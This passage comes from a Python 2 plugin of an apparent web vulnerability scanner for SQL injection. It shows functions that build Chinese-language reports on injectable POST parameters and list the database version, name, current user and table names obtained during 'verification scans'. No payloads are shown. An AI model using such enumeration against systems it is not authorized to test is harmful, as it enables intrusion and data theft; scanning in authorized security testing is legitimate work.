                        detail = detail + u"提交的参数{\"%s\" }存在POST提交方式的SQL注入，攻击者可通过POST方法提交非法参数进行SQL注入攻击。\n"  % (row.arg)
                    #end if
                #end for
                    detail = detail.encode('utf8')
                    if responsepostdetail!='':
                        responsepostdetail="%s%s"%('验证性扫描结果：',responsepostdetail)
                    list.append(getRecord(ob,tmp_url,ob['level'],detail=detail+responsepostdetail,request=row.request,response=row.response))
            #end if
        #end if

        return list
    except Exception,e:
        logger.error("File:SqlInjectionScript.py, run_url function :" + str(e))
        return []
    #ene  try
#end def

def check_tables(tablename):
    list = []
    try:
        if tablename and len(tablename) > 0:
            for row in tablename:
                row = row.replace("\n","").replace("\r","").replace(" ","")
                if row == "":
                    continue
                else:
                    if row in list:
                        continue
                    else:
                        list.append(row)
                    #end if
                #end if
            #end for
        #end if
    except Exception,e:
        logger.error("File:sqlinjectionscript.py, Get_tables function :" + str(e) )
    #end try
    return list
#end def

def Get_tables(tablename):
    table_name=""
    try:
        if len(tablename)>0:
            for i in range(0,len(tablename)):
                table_name=table_name+tablename[i]+"\n"

    except Exception,e:
        logger.error("File:sqlinjectionscript.py, Get_tables function :" + str(e) )
    return table_name
#end def

def response_detail(database_version,databasename,database_Current_user,Gettables,tablenum):
    
    response_detail=""


    try:

        if database_version!='' and  database_version!='None':

            response_detail=response_detail+"\n数据库版本为:"+database_version
        if databasename!='' and databasename!='None':
            response_detail=response_detail+"\n当前数据库名:"+databasename
        if database_Current_user!='' and database_Current_user!='None':
            response_detail=response_detail+"\n本地用户为:"+database_Current_user
        if Gettables!='' and Gettables!='None' and tablenum!=0:
            response_detail=response_detail+"\n前"+str(tablenum)+"个数据表为:\n"+Gettables


    #end if
    except Exception,e:
        logger.error("File:sqlinjectionscript.py, response_detail function :" + str(e) )
    return response_detail


